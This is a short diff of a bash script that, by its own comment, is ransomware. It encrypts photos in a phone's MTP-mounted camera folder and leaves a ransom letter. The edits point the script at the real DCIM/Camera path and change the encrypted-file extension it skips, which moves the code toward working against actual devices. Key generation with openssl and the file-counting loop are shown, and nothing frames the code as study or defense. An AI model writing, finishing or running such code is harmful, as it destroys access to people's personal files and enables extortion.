@@ -1,7 +1,7 @@
 #!/bin/bash
 #This script finds and encrypts photos found in the camera folder, as well as leaves behind a nasty ransom letter.
 
-PHONEPATH=$(echo /run/user/$UID/gvfs/mtp*/*/DCIM/CameraDev)
+PHONEPATH=$(echo /run/user/$UID/gvfs/mtp*/*/DCIM/Camera)
 
 LOCALPATH=$(pwd)
 
@@ -20,7 +20,7 @@ enc_key=$(openssl rand 16 -hex)
 cd "$PHONEPATH"
 
 currentfile=1
-filecount=$(ls -1 | grep -v "ransom" | grep -v ".lol" | wc -l)
+filecount=$(ls -1 | grep -v "ransom" | grep -v ".enc.jpg" | wc -l)
  
 for f in *
 do 
